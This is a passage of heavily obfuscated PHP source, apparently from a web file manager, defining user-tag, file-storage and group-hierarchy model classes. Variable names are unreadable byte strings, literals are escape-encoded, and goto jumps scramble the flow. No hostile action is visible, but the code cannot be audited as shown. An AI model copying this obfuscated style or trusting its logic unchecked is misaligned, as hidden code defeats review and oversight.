{ $Ö‘ÉÉ»¥ =& $_SERVER[Á÷ ­Šë]; if (!defined($Ö‘ÉÉ»¥[478])) { define($Ö‘ÉÉ»¥[478], 0); } return "\125\163\x65\x72\117\160\x74\x69\x6f\156\x5f{$í‡ı´¡²}\137" . USER_ID; } protected function filterWhere($¹ì§Ù¼™) { $±Ô’è¼ =& $_SERVER[Á÷ ­Šë]; if (!defined($±Ô’è¼[478])) { define($±Ô’è¼[478], 0); } $¹ì§Ù¼™[$±Ô’è¼[1574]] = USER_ID; return $¹ì§Ù¼™; } public function cacheRemoveUser($±ı”¬Ñè, $ÙéÖÛìÈ) { return Cache::remove("\x55\x73\145\x72\117\160\x74\x69\x6f\x6e\137{$±ı”¬Ñè}\x5f" . $ÙéÖÛìÈ); } protected function optionDefault($óÏÃ¥ = '') { $ÄŸ¨Ø¨À =& $_SERVER[Á÷ ­Šë]; if ($óÏÃ¥ == $ÄŸ¨Ø¨À[33]) { return $GLOBALS[$ÄŸ¨Ø¨À[6]][$ÄŸ¨Ø¨À[2216]]; } if ($óÏÃ¥ == $ÄŸ¨Ø¨À[2217]) { return $GLOBALS[$ÄŸ¨Ø¨À[6]][$ÄŸ¨Ø¨À[2218]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\x2e\x74\x61\147\x4c\151\163\164"; public $modelType = "\x55\x73\x65\x72\117\160\164\151\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\163\x74\171\x6c\145", "\x73\x6f\162\x74"); public function listData($—§ñµ®í = false, $–Ëïß´Ô = "\163\x6f\x72\x74", $â´äÓØŞ = false) { return parent::listData($—§ñµ®í, $–Ëïß´Ô, $â´äÓØŞ); } public function remove($´¸ùôĞ‹) { return parent::remove($´¸ùôĞ‹); } public function add($·Åâæ—, $ºÆÄãı… = "\x6c\x61\142\x65\154\55\147\x72\x65\x79\x2d\x6e\157\162\x6d\x61\x6c") { $Ã•ìï§÷ =& $_SERVER[Á÷ ­Šë]; if ($this->findByName($·Åâæ—)) { return !1; } $ğéÙäÛ = array($Ã•ìï§÷[425] => $·Åâæ—, $Ã•ìï§÷[488] => $ºÆÄãı…, $Ã•ìï§÷[1746] => $this->getSort($Ã•ìï§÷[265]) + 1); return parent::insert($ğéÙäÛ); } public function update($±Ÿ½—»ƒ, $òèˆ¦) { $§ˆ²ïíÉ =& $_SERVER[Á÷ ­Šë]; $é²¤ûËÕ = $this->listData($±Ÿ½—»ƒ); $ó£ï• = $this->findByName($òèˆ¦[$§ˆ²ïíÉ[28]]); if (!$é²¤ûËÕ || $ó£ï• && $ó£ï•[$§ˆ²ïíÉ[404]] != $é²¤ûËÕ[$§ˆ²ïíÉ[404]]) { return !1; } return parent::update($±Ÿ½—»ƒ, $òèˆ¦); } public function moveTop($Ú‰õîœİ) { $Î€¡²çÑ =& $_SERVER[Á÷ ­Šë]; $¾é”Ò¹ = parent::listData(); $•ØÑÊ¨ = $this->getSort($Î€¡²çÑ[264]); foreach ($¾é”Ò¹ as &$ÆíÑş) { if ($ÆíÑş[$Î€¡²çÑ[404]] == $Ú‰õîœİ) { $ÆíÑş[$Î€¡²çÑ[1765]] = $•ØÑÊ¨; continue; } $ÆíÑş[$Î€¡²çÑ[1765]] += 1; } unset($ÆíÑş); return parent::resetData($¾é”Ò¹); } public function moveBottom($çñî“Ğ²) { $”ĞÎûğÑ =& $_SERVER[Á÷ ­Šë]; $‰øŞ•› = $this->getSort($”ĞÎûğÑ[265]) + 1; return parent::update($çñî“Ğ², array($”ĞÎûğÑ[1765] => $‰øŞ•›)); } public function resetSort($ë†½±èÔ) { $Ä„Éö =& $_SERVER[Á÷ ­Šë]; $ù‡ÀµÊ = array(); $ë†½±èÔ = is_array($ë†½±èÔ) ? $ë†½±èÔ : array(); for ($ª’µ£è = 0; $ª’µ£è < count($ë†½±èÔ); $ª’µ£è++) { $ù‡ÀµÊ[$ë†½±èÔ[$ª’µ£è] . $Ä„Éö[33]] = $ª’µ£è + 1; } $³’û«Ìˆ = parent::listData(); foreach ($³’û«Ìˆ as &$æ”â¸Ùá) { $áıç¿ú = $ù‡ÀµÊ[$æ”â¸Ùá[$Ä„Éö[404]]]; $æ”â¸Ùá[$Ä„Éö[1765]] = $áıç¿ú ? $áıç¿ú : $æ”â¸Ùá[$Ä„Éö[1765]]; } unset($æ”â¸Ùá); return parent::resetData($³’û«Ìˆ); } private function getSort($ÔşÀµÅ«) { $¬¼‰ñÏƒ =& $_SERVER[Á÷ ­Šë]; $“˜¥âò = parent::listData(); $øÖıƒ„ô = array_to_keyvalue($“˜¥âò, $¬¼‰ñÏƒ[33], $¬¼‰ñÏƒ[1765]); if (!$øÖıƒ„ô) { $øÖıƒ„ô = array(0); } $…ÊêÆ™Ã = $ÔşÀµÅ« == $¬¼‰ñÏƒ[265] ? max($øÖıƒ„ô) : min($øÖıƒ„ô); return intval($…ÊêÆ™Ã); } } goto BâÃñ˜øŞŞ; FÚŸ‡‹İøÊ: class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\154\x65"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\155\145" => "\151\157\137\146\x69\154\x65\137\x6d\145\164\141", "\x6d\145\x74\141\x46\x69\145\154\144" => "\146\x69\154\145\111\x44"); public function fileInfo($„Îİœ) { $÷†Ë‹¶Ã =& $_SERVER[Á÷ ­Šë]; static $’Ø´ = array(); if (!isset($’Ø´[$„Îİœ])) { $öÚ°é« = $÷†Ë‹¶Ã[1790]; $Ùå†¢Ö² = Model($÷†Ë‹¶Ã[474])->field($öÚ°é«)->where(array($÷†Ë‹¶Ã[472] => $„Îİœ))->find(); $’Ø´[$„Îİœ] = $Ùå†¢Ö²; } return $’Ø´[$„Îİœ]; } public function addFileByContent($™Ñ÷¹ôâ = '', $ã÷óÕ = '') { $†ÍĞ’™ò =& $_SERVER[Á÷ ­Šë]; $÷—ëÆÍÀ = TEMP_PATH . $†ÍĞ’™ò[1791]; if (!is_dir($÷—ëÆÍÀ)) { mk_dir($÷—ëÆÍÀ); } $Òó³Á› = $÷—ëÆÍÀ . $†ÍĞ’™ò[1792] . rand_string(16); file_put_contents($Òó³Á›, $™Ñ÷¹ôâ); $ò²´÷æ¨ = $this->addFile($Òó³Á›, $ã÷óÕ, !0); if (file_exists($Òó³Á›)) { @unlink($Òó³Á›); } return $ò²´÷æ¨; } public function createFileName($¾æÏ¶Ëş, $ƒıÅı·Ş = false, $ÉÊŸ¸š = false) { $ùçÁÇ…ë =& $_SERVER[Á÷ ­Šë]; $–¥êú = IO::init($ùçÁÇ…ë[8]); $Ù×¨îÑ” = $this->makeFilePath($¾æÏ¶Ëş, $–¥êú, $ƒıÅı·Ş, $ÉÊŸ¸š); $¹‹Èé› = $–¥êú->pathFather($Ù×¨îÑ”); static $ºÊûëÕ³ = false; $ÖÇÍ‡³‡ = $ùçÁÇ…ë[1793] . md5($¹‹Èé›); if (!$ºÊûëÕ³ && !Cache::get($ÖÇÍ‡³‡)) { $ºÊûëÕ³ = !0; $¾ü÷æ¼Ø = IO::mkdir($¹‹Èé›); if (!IO::exist($¾ü÷æ¼Ø . $ùçÁÇ…ë[798])) { IO::mkfile($¾ü÷æ¼Ø . $ùçÁÇ…ë[798]); } Cache::set($ÖÇÍ‡³‡, 1, 3600 * 2); } return $Ù×¨îÑ”; } public function makeFilePath($·×Ìşú, $õöªŸ´, $ú¬ñ‚¿² = false, $–¢Ò‡‹” = false) { $¯…×¿Áƒ =& $_SERVER[Á÷ ­Šë]; $€‡ò·˜— = Model($¯…×¿Áƒ[765])->get($¯…×¿Áƒ[1794]); $õ§×Ôæ­ = KodIO::defaultIO() . date($¯…×¿Áƒ[1795]); $»“±Ûì’ = $õ§×Ôæ­ . rand_string(5) . short_id(100); $·×Ìşú = str_replace($¯…×¿Áƒ[8], $¯…×¿Áƒ[81], KodIO::clear($·×Ìşú)); $¶‹ŠĞ°— = $õöªŸ´->ext($·×Ìşú); if (!$·×Ìşú) { $€‡ò·˜— = $¯…×¿Áƒ[1796]; } switch ($€‡ò·˜—) { case $¯…×¿Áƒ[1797]: $»“±Ûì’ = $»“±Ûì’ . $¯…×¿Áƒ[105] . $õöªŸ´->ext($·×Ìşú); if ($¶‹ŠĞ°— == $¯…×¿Áƒ[1734]) { $»“±Ûì’ .= $¯…×¿Áƒ[1470]; } break; case $¯…×¿Áƒ[1798]: $·ÈŞŸ±¯ = Model($¯…×¿Áƒ[765])->get($¯…×¿Áƒ[766]); $‘şºçâ† = substr(md5($¯…×¿Áƒ[767] . $·ÈŞŸ±¯ . date($¯…×¿Áƒ[743])), 0, 8); $ñò©ë = KodIO::defaultDriver(); $õ§×Ôæ­ = $¯…×¿Áƒ[1155] . $ñò©ë[$¯…×¿Áƒ[404]] . $¯…×¿Áƒ[414] . date($¯…×¿Áƒ[1799]) . $‘şºçâ† . $¯…×¿Áƒ[8]; if ($¶‹ŠĞ°— == $¯…×¿Áƒ[1734]) { $·×Ìşú .= $¯…×¿Áƒ[1470]; } $Œ “ıÓ– = $¯…×¿Áƒ[1800] . $õ§×Ôæ­ . $·×Ìşú; CacheLock::lock($Œ “ıÓ–); $»“±Ûì’ = $õ§×Ôæ­ . $·×Ìşú; if (IO::exist($õ§×Ôæ­ . $·×Ìşú)) { $Ë¡‹¸Š± = substr($·×Ìşú, 0, strlen($·×Ìşú) - strlen($¶‹ŠĞ°—)); $²Í„‚Û = $–¢Ò‡‹” ? substr($–¢Ò‡‹”, 0, 5) : ($ú¬ñ‚¿² ? substr($ú¬ñ‚¿², 0, 5) : rand_string(5)); $»“±Ûì’ = $õ§×Ôæ­ . $Ë¡‹¸Š± . $²Í„‚Û . $¯…×¿Áƒ[105] . $¶‹ŠĞ°—; } if (IO::isTypeObject($»“±Ûì’) && !IO::isUploadServer($»“±Ûì’)) { if (IO::exist($»“±Ûì’)) { return $»“±Ûì’; } $ßÔá˜™¡ = IO::setContent($»“±Ûì’, $¯…×¿Áƒ[33]); if (!$ßÔá˜™¡) { show_json($¯…×¿Áƒ[1801], !1); } } CacheLock::unlock($Œ “ıÓ–); break; case $¯…×¿Áƒ[1796]: break; default: break; } return $»“±Ûì’; } public function addFileByRemote($ÓÔ¡¥ş¹, $®îûæÕ”, $±Âà×ƒ˜ = array()) { $—³˜üôŒ =& $_SERVER[Á÷ ­Šë]; if (!IO::exist($ÓÔ¡¥ş¹)) { return !1; } $Œáş¬¿² = $±Âà×ƒ˜[$—³˜üôŒ[180]] ? $±Âà×ƒ˜[$—³˜üôŒ[180]] : $—³˜üôŒ[33]; $‹êâé×Î = IO::hashMd5($ÓÔ¡¥ş¹, $Œáş¬¿²); $ÇŒ¾èƒª = KodIO::defaultDriver(); $©ŠùÁäö = array($—³˜üôŒ[583] => IO::size($ÓÔ¡¥ş¹), $—³˜üôŒ[1802] => 1, $—³˜üôŒ[425] => $®îûæÕ”, $—³˜üôŒ[810] => $ÇŒ¾èƒª[$—³˜üôŒ[404]], $—³˜üôŒ[426] => $ÓÔ¡¥ş¹, $—³˜üôŒ[1803] => $±Âà×ƒ˜[$—³˜üôŒ[181]] ? $±Âà×ƒ˜[$—³˜üôŒ[181]] : IO::hashSimple($ÓÔ¡¥ş¹), $—³˜üôŒ[1804] => $‹êâé×Î ? $‹êâé×Î : $Œáş¬¿²); if ($ „¯§¹è = $this->addFileCheckExist($©ŠùÁäö[$—³˜üôŒ[181]], $©ŠùÁäö[$—³˜üôŒ[180]], $©ŠùÁäö[$—³˜üôŒ[88]])) { return $ „¯§¹è; } return $this->addFileData($©ŠùÁäö); } private function addFileData($¾İ¯à½“) { $Ã–„ =& $_SERVER[Á÷ ­Šë]; if (!$¾İ¯à½“) { return !1; } $¾İ¯à½“[$Ã–„[88]] = intval($¾İ¯à½“[$Ã–„[88]]); if (!$¾İ¯à½“[$Ã–„[88]] && strlen($¾İ¯à½“[$Ã–„[181]]) > 32) { $¾İ¯à½“[$Ã–„[88]] = intval(substr($¾İ¯à½“[$Ã–„[181]], 32)); } $»üîôÒİ = $this->add($¾İ¯à½“); return $this->find($»üîôÒİ); } public function addFile($’ğ—èæ, $ŠåîÂ¦, $Ÿì¿Ô = false) { $ş·£ ‰ =& $_SERVER[Á÷ ­Šë]; $úØöŒ‚– = IO::hashSimple($’ğ—èæ); $ÙÔñê„Š = IO::size($’ğ—èæ); $û»ñİĞ = $ÙÔñê„Š <= 1024 * 1024 * 10 ? IO::hashMd5($’ğ—èæ) : $ş·£ ‰[33]; $½Î¬ùòÚ = $ş·£ ‰[1805] . $úØöŒ‚–; CacheLock::lock($½Î¬ùòÚ); if ($û»ñİĞ && $úØöŒ‚–) { $Ë¬û‰·ş = $this->addFileCheckExist($úØöŒ‚–, $û»ñİĞ, $ÙÔñê„Š); if ($Ë¬û‰·ş) { CacheLock::unlock($½Î¬ùòÚ); return $Ë¬û‰·ş; } } $¼ÃİÃÇÒ = $this->addFileMake($’ğ—èæ, $ÙÔñê„Š, $úØöŒ‚–, $û»ñİĞ, $ŠåîÂ¦, $Ÿì¿Ô); $›Å«Í¿Ì = $this->addFileData($¼ÃİÃÇÒ); CacheLock::unlock($½Î¬ùòÚ); if (!$û»ñİĞ && $›Å«Í¿Ì) { $this->fileMd5Check($›Å«Í¿Ì); } return $›Å«Í¿Ì; } private function fileMd5Check($¶Àâº‚’) { $Ÿƒºîšß =& $_SERVER[Á÷ ­Šë]; $ğ´æãÉŸ = array($¶Àâº‚’[$Ÿƒºîšß[471]], $¶Àâº‚’[$Ÿƒºîšß[86]]); $ÛïøÕŠô = $Ÿƒºîšß[1806] . $¶Àâº‚’[$Ÿƒºîšß[86]]; $¨é¤Á™° = $Ÿƒºîšß[1807] . $¶Àâº‚’[$Ÿƒºîšß[471]]; $ÀÖœÛÇæ = TaskQueue::add($Ÿƒºîšß[1808], $ğ´æãÉŸ, $ÛïøÕŠô, $¨é¤Á™°); if (!$ÀÖœÛÇæ) { $this->fileMd5Set($¶Àâº‚’[$Ÿƒºîšß[471]], $¶Àâº‚’[$Ÿƒºîšß[86]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($¡ù÷ƒ‰ş, $°°ã¯È) { $¼ğ¨ê±æ =& $_SERVER[Á÷ ­Šë]; $úÂ¼ˆ±ï = $this->find($¡ù÷ƒ‰ş); if (!$úÂ¼ˆ±ï || $úÂ¼ˆ±ï[$¼ğ¨ê±æ[180]]) { return; } $¼º†˜£â = IO::hashMd5($°°ã¯È); if (!$¼º†˜£â) { return $¼ğ¨ê±æ[33]; } $this->where(array($¼ğ¨ê±æ[471] => $¡ù÷ƒ‰ş))->save(array($¼ğ¨ê±æ[180] => $¼º†˜£â)); } public function addFileMake($éçİÉ³¡, $ ì“ì¾, $úŞ±ƒü, $÷Âı»éË, $Œ”¨©, $®©¨Œå) { $œËêÒ†ô =& $_SERVER[Á÷ ­Šë]; $ˆ€¯¿û = $this->createFileName($Œ”¨©, $úŞ±ƒü, $÷Âı»éË); $Óßùíàº = get_path_father($ˆ€¯¿û); $Å ó¸ó€ = get_path_this($ˆ€¯¿û); if ($®©¨Œå) { $‚ÏšÜğ„ = IO::move($éçİÉ³¡, $Óßùíàº, !1, $Å ó¸ó€); } else { $‚ÏšÜğ„ = IO::copy($éçİÉ³¡, $Óßùíàº, !1, $Å ó¸ó€); } if (!$‚ÏšÜğ„) { return !1; } $‘šõÁ°Ê = KodIO::defaultDriver(); $ŒÜÓÖø² = array($œËêÒ†ô[583] => $ ì“ì¾, $œËêÒ†ô[1802] => 1, $œËêÒ†ô[425] => $Œ”¨©, $œËêÒ†ô[810] => $‘šõÁ°Ê[$œËêÒ†ô[404]], $œËêÒ†ô[426] => $ˆ€¯¿û, $œËêÒ†ô[1803] => $úŞ±ƒü, $œËêÒ†ô[1804] => $÷Âı»éË); return $ŒÜÓÖø²; } public function addFileCheckExist($„œ›óŒ, $·¢Šı¶¦, $Õ¶¸à¶…) { $õ’ÃÜ =& $_SERVER[Á÷ ­Šë]; $óİ‰ò½Á = $this->findByHash($„œ›óŒ, $·¢Šı¶¦); if (!$óİ‰ò½Á) { return !1; } $è¼ç¸²Á = array($õ’ÃÜ[1802] => intval($óİ‰ò½Á[$õ’ÃÜ[1809]]) + 1, $õ’ÃÜ[583] => $Õ¶¸à¶…); $this->where(array($õ’ÃÜ[472] => $óİ‰ò½Á[$õ’ÃÜ[471]]))->save($è¼ç¸²Á); return $óİ‰ò½Á; } public function remove($°˜’ªêÅ) { $this->linkCountChange($°˜’ªêÅ, !1); $this->clearEmpty(); return !0; } public function linkAdd($£È‚ë˜ˆ) { $this->linkCountChange($£È‚ë˜ˆ, !0); } public function linkCountChange($Ã÷¦ÜÙ, $ó¶àò€á) { $“®·´Öç =& $_SERVER[Á÷ ­Šë]; if (!$Ã÷¦ÜÙ) { return; } if (!is_array($Ã÷¦ÜÙ)) { $Ã÷¦ÜÙ = array($Ã÷¦ÜÙ); } $ßö’ÈŒ = array(); foreach ($Ã÷¦ÜÙ as $à…ÜÜüÂ) { $ò˜Ñ„€´ = $à…ÜÜüÂ . $“®·´Öç[33]; if (!$ßö’ÈŒ[$ò˜Ñ„€´]) { $ßö’ÈŒ[$ò˜Ñ„€´] = 0; } $ßö’ÈŒ[$ò˜Ñ„€´]++; } $›ÓòÄ¡ = array(); foreach ($ßö’ÈŒ as $à…ÜÜüÂ => $â…¬û†») { $ò˜Ñ„€´ = $â…¬û†» . $“®·´Öç[33]; if (!$›ÓòÄ¡[$ò˜Ñ„€´]) { $›ÓòÄ¡[$ò˜Ñ„€´] = array(); } $›ÓòÄ¡[$ò˜Ñ„€´][] = $à…ÜÜüÂ; } foreach ($›ÓòÄ¡ as $â…¬û†» => $›‰ßôß¥) { if (!$›‰ßôß¥) { continue; } $â…¬û†» = $ó¶àò€á ? $â…¬û†» : -intval($â…¬û†»); $´½ı°² = array($“®·´Öç[471] => array($“®·´Öç[7], $›‰ßôß¥)); if ($â…¬û†» < 0) { $´½ı°²[$“®·´Öç[1809]] = array($“®·´Öç[1007], abs($â…¬û†»)); } $this->where($´½ı°²)->setAdd($“®·´Öç[1809], $â…¬û†»); } } public function findByHash($š”ıËŒ, $É¹õÎñ’ = false) { $˜»«ó† =& $_SERVER[Á÷ ­Šë]; if (!$š”ıËŒ && !$É¹õÎñ’) { return !1; } $íºÆ¡ñ = array($˜»«ó†[1803] => $š”ıËŒ); if ($É¹õÎñ’) { $íºÆ¡ñ = array($˜»«ó†[1804] => $É¹õÎñ’); } return $this->order($˜»«ó†[1810])->where($íºÆ¡ñ)->find(); } public function clearEmpty($¾ŸÛåĞä = 0) { $¸Èü©ú¾ =& $_SERVER[Á÷ ­Šë]; $¥ÍŞóÄû = time() - 3600 * 24 * $¾ŸÛåĞä; $ÒœêÅÆô = $¸Èü©ú¾[1811] . $¥ÍŞóÄû; $†Ş¢Ğûµ = $this->where($ÒœêÅÆô)->select(); if (!$†Ş¢Ğûµ) { return; } $±Â‰¦—ª = new Task($¸Èü©ú¾[1812], $¸Èü©ú¾[33], count($†Ş¢Ğûµ)); foreach ($†Ş¢Ğûµ as $Ê“ƒûÏ) { $±Â‰¦—ª->update(1); $this->resetFile($Ê“ƒûÏ); } $±Â‰¦—ª->end(); } public function resetFile($ÃÛÜëö) { $£ÅÅ‚ú =& $_SERVER[Á÷ ­Šë]; $æÁÇÑé = array($£ÅÅ‚ú[472] => $ÃÛÜëö[$£ÅÅ‚ú[471]]); $Ü³¾°Í» = Model($£ÅÅ‚ú[1249])->where($æÁÇÑé)->count(); $ö™ã¢Ø¥ = Model($£ÅÅ‚ú[1813])->where($æÁÇÑé)->count(); $æü¼İ = intval($Ü³¾°Í») + intval($ö™ã¢Ø¥); if ($æü¼İ == 0) { IO::remove($ÃÛÜëö[$£ÅÅ‚ú[86]]); Model($£ÅÅ‚ú[1814])->delete($ÃÛÜëö[$£ÅÅ‚ú[471]]); $this->where($æÁÇÑé)->delete(); $this->metaSet($ÃÛÜëö[$£ÅÅ‚ú[471]], null, null); return; } if ($ÃÛÜëö[$£ÅÅ‚ú[1809]] != $æü¼İ) { $this->where($æÁÇÑé)->save(array($£ÅÅ‚ú[1802] => $æü¼İ)); } } public function storageInfo($ÉùÆêÇ¨ = false) { $Ã¾Õº‰ =& $_SERVER[Á÷ ­Šë]; $¹ïªüã© = $this->count() + 0.0; $Ğµé®Â¦ = 0; $­µ¸™Ó¼ = 1; $¯Ñšç‘õ = 0; $»¿€æüû = 5000; for ($ŞÌÉè¬‰ = 0; $ŞÌÉè¬‰ < $¹ïªüã©; $ŞÌÉè¬‰ = $ŞÌÉè¬‰ + $»¿€æüû) { $áı€¶¨  = $this->limit($ŞÌÉè¬‰, $ŞÌÉè¬‰ + $»¿€æüû)->select(); foreach ($áı€¶¨  as $Òé²ÜÌ¤) { $­µ¸™Ó¼ += $Òé²ÜÌ¤[$Ã¾Õº‰[88]] * $Òé²ÜÌ¤[$Ã¾Õº‰[1809]]; $Ğµé®Â¦ += $Òé²ÜÌ¤[$Ã¾Õº‰[88]] * ($Òé²ÜÌ¤[$Ã¾Õº‰[1809]] - 1); $¯Ñšç‘õ += $Òé²ÜÌ¤[$Ã¾Õº‰[1809]]; } } $öİÔâÜÌ = array($Ã¾Õº‰[1815] => $­µ¸™Ó¼, $Ã¾Õº‰[1816] => $Ğµé®Â¦, $Ã¾Õº‰[1817] => $Ğµé®Â¦ / $­µ¸™Ó¼, $Ã¾Õº‰[92] => $¹ïªüã©, $Ã¾Õº‰[1818] => $¯Ñšç‘õ); return $öİÔâÜÌ; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\x70"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\155\145" => "\147\x72\157\165\160\x5f\x6d\145\x74\x61", "\x6d\145\164\141\106\x69\x65\154\144" => "\147\x72\157\165\160\111\104"); protected function cacheFunctionAlias($»­Á¹·) { $ÔìäÛ­Ó =& $_SERVER[Á÷ ­Šë]; return array($ÔìäÛ­Ó[1819] => array($»­Á¹·[0], $ÔìäÛ­Ó[1820]), $ÔìäÛ­Ó[1821] => array($»­Á¹·[0], $ÔìäÛ­Ó[1822])); } protected function getInfo($ÍÂü†ÖÃ, $×‹ÀÍ˜Ê = false) { $òêùæğ = $this->getInfoSimple($ÍÂü†ÖÃ); if (!$òêùæğ) { return !1; } if ($×‹ÀÍ˜Ê) { return $this->_listDataApplyItem($òêùæğ); } return $this->cacheFunctionGet($_SERVER[Á÷ ­Šë][1823], $ÍÂü†ÖÃ); } protected function getInfoSimple($µóï¢÷, $ãË‘ÛºË = false) { $Š±êÌ—ô =& $_SERVER[Á÷ ­Šë]; if ($ãË‘ÛºË) { $ğ„»÷µë = array($Š±êÌ—ô[1742] => intval($µóï¢÷)); $àåÜŠş = $this->where($ğ„»÷µë)->find(); return is_array($àåÜŠş) ? $àåÜŠş : array(); } return $this->cacheFunctionGet($Š±êÌ—ô[1824], $µóï¢÷); } protected function groupAdd($Ì£ô»»­) { $Ûèõİá =& $_SERVER[Á÷ ­Šë]; if (!$Ì£ô»»­[$Ûèõİá[502]] && isset($Ì£ô»»­[$Ûèõİá[1742]]) && $Ì£ô»»­[$Ûèõİá[1742]] == 1) { if ($ÃÈºèª = $this->getInfoSimple($Ì£ô»»­[$Ûèõİá[1742]], !0)) { return $Ì£ô»»­[$Ûèõİá[1742]]; } } else { $ÃÈºèª = $this->getInfoSimple($Ì£ô»»­[$Ûèõİá[502]]); if (!$ÃÈºèª) { return !1; } } $‡•í´Ô™ = $Ûèõİá[535]; if ($ÃÈºèª[$Ûèõİá[525]]) { $‡•í´Ô™ = $ÃÈºèª[$Ûèõİá[525]] . $ÃÈºèª[$Ûèõİá[1742]] . $Ûèõİá[47]; } $‹ïÔ’¹ß = array($Ûèõİá[425] => $this->groupNameAuto($Ì£ô»»­[$Ûèõİá[502]], $Ì£ô»»­[$Ûèõİá[28]]), $Ûèõİá[406] => $Ì£ô»»­[$Ûèõİá[502]], $Ûèõİá[588] => $‡•í´Ô™, $Ûèõİá[1825] => $Ì£ô»»­[$Ûèõİá[1728]], $Ûèõİá[1826] => 0, $Ûèõİá[1746] => 0); if (isset($Ì£ô»»­[$Ûèõİá[1765]])) { $‹ïÔ’¹ß[$Ûèõİá[1765]] = $Ì£ô»»­[$Ûèõİá[1765]]; } else { $ßÏĞÃ«ˆ = $this->max($Ûèõİá[1765]); if (!$ßÏĞÃ«ˆ) { $ßÏĞÃ«ˆ = 0; } $‹ïÔ’¹ß[$Ûèõİá[1765]] = $ßÏĞÃ«ˆ + 1; } if (!empty($Ì£ô»»­[$Ûèõİá[1742]])) { $‹ïÔ’¹ß[$Ûèõİá[1742]] = $Ì£ô»»­[$Ûèõİá[1742]]; } $–«ÏúÌ‚ = $this->add($‹ïÔ’¹ß); $this->setNamePinyin($–«ÏúÌ‚, $‹ïÔ’¹ß[$Ûèõİá[28]]); if (isset($Ì£ô»»­[$Ûèõİá[1827]])) { $this->metaSet($–«ÏúÌ‚, array($Ûèõİá[1827] => $Ì£ô»»­[$Ûèõİá[1827]], $Ûèõİá[1828] => $Ì£ô»»­[$Ûèõİá[1828]])); unset($Ì£ô»»­[$Ûèõİá[1827]]); unset($Ì£ô»»­[$Ûèõİá[1828]]); } Model($Ûèõİá[1249])->groupRootAdd($–«ÏúÌ‚); return $–«ÏúÌ‚; } protected function groupEdit($Ñ«øÔİ‹, $ÂÅ¨­©Á) { $œ‘ô–… =& $_SERVER[Á÷ ­Šë]; $Ù™ê§ôì = $this->getInfoSimple($Ñ«øÔİ‹); if (!$Ù™ê§ôì) { return !1; } if (!empty($ÂÅ¨­©Á[$œ‘ô–…[502]])) { $ã’âƒñ = $this->getInfoSimple($ÂÅ¨­©Á[$œ‘ô–…[502]]); if (!$ã’âƒñ) { return !1; } if ($Ù™ê§ôì[$œ‘ô–…[1742]] == $ã’âƒñ[$œ‘ô–…[1742]]) { return !1; } if ($ÂÅ¨­©Á[$œ‘ô–…[502]] != $Ù™ê§ôì[$œ‘ô–…[502]]) { if ($ã’âƒñ[$œ‘ô–…[525]] !== $Ù™ê§ôì[$œ‘ô–…[525]] && strpos($ã’âƒñ[$œ‘ô–…[525]], $Ù™ê§ôì[$œ‘ô–…[525]] . $Ù™ê§ôì[$œ‘ô–…[1742]] . $œ‘ô–…[47]) === 0) { return !1; } $ÂÅ¨­©Á[$œ‘ô–…[588]] = $ã’âƒñ[$œ‘ô–…[525]] . $ÂÅ¨­©Á[$œ‘ô–…[502]] . $œ‘ô–…[47]; $this->_changeChildLevel($Ù™ê§ôì, $ã’âƒñ); } } if (isset($ÂÅ¨­©Á[$œ‘ô–…[28]])) { $this->setNamePinyin($Ñ«øÔİ‹, $ÂÅ¨­©Á[$œ‘ô–…[28]]); } if (isset($ÂÅ¨­©Á[$œ‘ô–…[1827]])) { $this->metaSet($Ñ«øÔİ‹, array($œ‘ô–…[1827] => $ÂÅ¨­©Á[$œ‘ô–…[1827]], $œ‘ô–…[1828] => $ÂÅ¨­©Á[$œ‘ô–…[1828]])); unset($ÂÅ¨­©Á[$œ‘ô–…[1827]]); unset($ÂÅ¨­©Á[$œ‘ô–…[1828]]); } $this->_clearChildrenCache($Ù™ê§ôì); return $this->where(array($œ‘ô–…[1829] => $Ñ«øÔİ‹))->save($ÂÅ¨­©Á); } private function _clearChildrenCache($²İ¬ó›) { $¶±ûú¿ =& $_SERVER[Á÷ ­Šë]; $ú¼êÕ³ = array($¶±ûú¿[588] => array($¶±ûú¿[548], $²İ¬ó›[$¶±ûú¿[525]] . $²İ¬ó›[$¶±ûú¿[1742]] . $¶±ûú¿[549])); $„ê‡‡¢ô = $this->field($¶±ûú¿[1742])->where($ú¼êÕ³)->select(); foreach ($„ê‡‡¢ô as $íµÑùğ›) { $this->_clearCache($íµÑùğ›[$¶±ûú¿[1742]]); } } private function _clearCache($ ï¦÷ëÊ) { $ñÃ¼Ğ¿  =& $_SERVER[Á÷ ­Šë]; $this->cacheFunctionClear($ñÃ¼Ğ¿ [1823], $ ï¦÷ëÊ); $this->cacheFunctionClear($ñÃ¼Ğ¿ [1824], $ ï¦÷ëÊ); } private function _changeChildLevel($“º·œ, $ı•ÏØ×ñ, $—Ãıú©€ = false) { $ŞÛÚà³ =& $_SERVER[Á÷ ­Šë]; $ƒªı«ìÒ = $“º·œ[$ŞÛÚà³[525]] . $“º·œ[$ŞÛÚà³[1742]] . $ŞÛÚà³[47]; $º‘ƒÜİ¼ = $ı•ÏØ×ñ[$ŞÛÚà³[525]] . $ı•ÏØ×ñ[$ŞÛÚà³[1742]] . $ŞÛÚà³[47] . $“º·œ[$ŞÛÚà³[1742]] . $ŞÛÚà³[47]; if ($—Ãıú©€) { $º‘ƒÜİ¼ = $ı•ÏØ×ñ[$ŞÛÚà³[525]] . $ı•ÏØ×ñ[$ŞÛÚà³[1742]] . $ŞÛÚà³[47]; } $Û¶ØâĞ· = array($ŞÛÚà³[588] => array($ŞÛÚà³[548], $“º·œ[$ŞÛÚà³[525]] . $“º·œ[$ŞÛÚà³[1742]] . $ŞÛÚà³[549])); $„°ê¹õ = array($ŞÛÚà³[588] => array($ŞÛÚà³[597], "\162\x65\160\x6c\x61\x63\x65\50\x70\141\x72\x65\156\164\x4c\x65\x76\145\154\x2c\47{$ƒªı«ìÒ}\x27\54\x27{$º‘ƒÜİ¼}\47\51")); $this->_clearChildrenCache($“º·œ); $this->where($Û¶ØâĞ·)->data($„°ê¹õ)->save(); } public function setNamePinyin($ÚûÄ«²…, $‰ÀÑÛ“— = false) { $Ï¯†õÃ =& $_SERVER[Á÷ ­Šë]; if (!$‰ÀÑÛ“—) { $çËÏÓ‹î = $this->getInfoSimple($ÚûÄ«²…); $‰ÀÑÛ“— = 